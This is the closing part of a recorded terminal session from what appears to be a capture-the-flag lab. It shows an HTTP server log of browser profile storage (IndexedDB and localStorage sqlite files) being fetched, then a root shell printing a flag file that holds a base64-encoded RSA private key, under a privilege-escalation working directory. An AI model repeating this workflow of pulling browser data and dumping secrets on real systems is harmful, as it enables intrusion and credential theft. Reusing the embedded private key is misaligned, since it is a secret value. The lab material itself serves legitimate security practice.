+10.8.61.245 - - [17/Feb/2025 08:40:46] "GET /8k3bf3zp.charles/settings/main/ms-language-packs/browser/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:47] "GET /8k3bf3zp.charles/storage/default/https%2B%2B%2Bwww.google.com/.metadata-v2 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:48] "GET /8k3bf3zp.charles/storage/default/https%2B%2B%2Bwww.google.com/ls/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:49] "GET /8k3bf3zp.charles/storage/permanent/chrome/.metadata-v2 HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:50] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:51] "GET /8k3bf3zp.charles/settings/main/ms-language-packs/browser/newtab/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:52] "GET /8k3bf3zp.charles/storage/default/https%2B%2B%2Bwww.google.com/ls/data.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:54] "GET /8k3bf3zp.charles/storage/default/https%2B%2B%2Bwww.google.com/ls/usage HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:55] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.files/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:56] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:58] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.files/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:40:58] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:41:00] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.files/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:41:01] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:41:03] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/2918063365piupsah.files/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:41:04] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/2918063365piupsah.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:41:06] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/3561288849sdhlie.files/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:41:07] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/3561288849sdhlie.sqlite HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:41:09] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.files/ HTTP/1.1" 200 -
+10.8.61.245 - - [17/Feb/2025 08:41:10] "GET /8k3bf3zp.charles/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+bash-4.4# ^C
+bash-4.4# ^C
+bash-4.4# ^C
+bash-4.4# [Kbash-4.4# ls
+8k3bf3zp.charles
+bash-4.4# cd /root
+bash-4.4# ls
+flag.py  flag.pyc  __pycache__	test.py
+bash-4.4# cat gla[K[K[Kflag.py
+flag=("LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBejF5RnJnOUZBWkFJNFIzN2FRV24vZVBUay9NS2Z6MktRK09FNDVLRXJndUwzNFlqCjVLYzFWSmpEVFROUm1jK3ZOUlppZUM4RXdlbFdncHdjS0FDYTcwS2UycS83elJMV0hoMjNPVXhXaVNBQU9SVGUKYTFzNWV1czNnaFRXamNmT05ST0FrRWc3TzNYc053Z3A5M1VVQjh3YlUrQURwWm5GTFBVREVyRktvU3ArZHhHNApyeHdxcEFwNm1hcXNFNGRJWkhkQXErWXQ2LzJIT0VSS3JGV2lPTlFwZDZaQThhMzI1b1dYWThVYVJFdktUdVhjCmpsTDU2dDRpV1F6c1JRYkJ2QitFVGcybWEwMXUvSG1XM005U3lyb1B5cGNFT3F2UG51UHBxWEhadTdCd0FMTTUKTkhoWENObXQrMEVPQllLdmVqc0RBNk5lWmZKZ3c2NU5WSysyaFFJREFRQUJBb0lCQUNKeVpVYW9CTGVndk1qZwoyUzMySVpVY3JyNHFKcmxDZU9DVVFEUXAxOTZ0emx1Z2hmL3JBd0g5cXB2OWhYVyt1WVZoSlpSL2d4UFBkbTZXCkRsdGExbUlldUJMdUh5OVBETURPQU8wRTBHOVJJSmhhN2lQNWNKQUoyUnZENkd4L0g3TlRmUXo2NHRRYTM5VzQKaG5nME85S2J4b0psZVZXZU9OSWlGWk9hWGlKdGh1cm8vZDlHU2l2TUJKeVQ4UFIzSkc2RytSNFFxMXRBSnFFVQpIeDVEWS9VN3FWWVExVEUzRWZiRFI1eTArOTcyZlc3SjBvWnhPdXdLNklXUDlUdEhjUFBWSUd3ZWFJZ1pGeXMzCjNaRkV6T041cVJoTmRWOGxjMTI3Y1VYNVI1aEZqbjE0R0hKTHB2YmprdDhEOURnZ1VLS05SOHpQSmZJR081VHAKZ2R6Y2xtRUNnWUVBK2thVmkwaHExc1lTZFpMNHdIeERRSmZHb29QbjhIYWU4ekZyc1lqclZEOG5PUTlORXo0TgpYS3FsR01oUGM4UDBQdnVvS3kxMzQxdHk5NjZTOEorZEtmZFB6UlVSRnpCODR3eTNBNkNEblZpUnBDWXdLRm8wCkFhNXd3cFdaYWxCQnBFaXMwaDNZS0NLVkt5aHM0L3VONmxNdzVIM0dhQ01kcXFtMDBsOURSbTBDZ1lFQTFCcXEKZTJwUFlWQ3d5UWIyMC84YVAzMDV3dTZCZHAraTNkVXFrSG5kaFBYbUVMOEVuWGJFSnVCeW1uN2FLUTNMbi96WAo4Ry83TXplODQ1ZzkzS0FQRkxlZU5rL0FtelhLbldCOG1nY3JGenhBRC93QXhIMUo5b3RMdmhtWDdCUlZFNlgvCjBoZTZnMW1kdE5NWGJ0MEIvYU1PUytkQ3NNVzFDLzdvVWZieEFYa0NnWUFsQ3ZWdlhCU1VIVlQyR2Y2L1hxVUYKbG5GTDlJSUwwVUxOYys4Z284ZFEvTmZ0VmhwdVVxemZubEk1VE15VnNkY2d5MWFrcldJbFFJL1BvUU1Xb2trOAp3T0lLMUtkbTYwSlF5THo5eUhBeWhiMW9zazVHYXJOdjNFWE1SeUFoNENjWERicW1qc3hEaEhyWG5IQWhma1lPCi9La3I2SUhKUUFsUURUWTZQT2RVTVFLQmdRQ1BQa01NZmt1RnlWemJKdHpqWjFGdXR6K2ZLanc4eEtyVmJmVUYKQlloWkYwaDgzc1JiSTY1dEl2L0MzeEN1MFNaSHNoYVR4c3k3VmxVMno4WlhqYkVocUxBc3RjZTZDcVgvaXY0YgpkK1BlR1U2YWZQSjN3TFdHejZRamlsMVRqcGUyWVZGWHJiYkVwbTBmaGNBNW13Q1JMdUdrMlZYczFGams5UTRvCjdNRHU0UUtCZ0ZJb213aEQram1yM1ZjMkh1dFlrbDN6bGlTRDIzOXNIM2sxMThzVEhiZWR2S0g1UTdudzBDK1UKYTdSTXAvY1hXWktkeVJnRnhRN0RRRW9yeldpNWJMQXl4WG5NZzBnaHdXZGY0bnVnUW1hRUc3dCtPWVVOc2Y3TQpmREx6TUE5MTVXY09EUjZMMG1XTzBjckFNYlpRT2tnMUtsQWl3UVNRbXVVcFBxeUFmcTZ4Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==")
+bash-4.4# exit
+exit
+]0;beth@london: /tmp/privesc/ZDI-24-020[01;32mbeth@london[00m:[01;34m/tmp/privesc/ZDI-24-020[00m$ exit
+logout
+Connection to london.bridge.thm closed.
+
+Script done on 2025-02-17 19:46:51+03:00 [COMMAND_EXIT_CODE="0"]
